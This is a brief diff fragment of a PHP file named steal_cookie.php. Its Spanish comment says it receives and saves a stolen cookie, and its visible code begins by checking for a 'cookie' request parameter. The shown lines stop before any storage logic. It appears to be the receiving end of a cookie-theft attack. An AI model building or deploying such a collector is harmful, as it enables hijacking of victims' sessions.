@@ -1,3 +1,4 @@
+
 <?php
 // steal_cookie.php - Un script simple para recibir y guardar la cookie robada
 if (isset($_GET['cookie'])) {
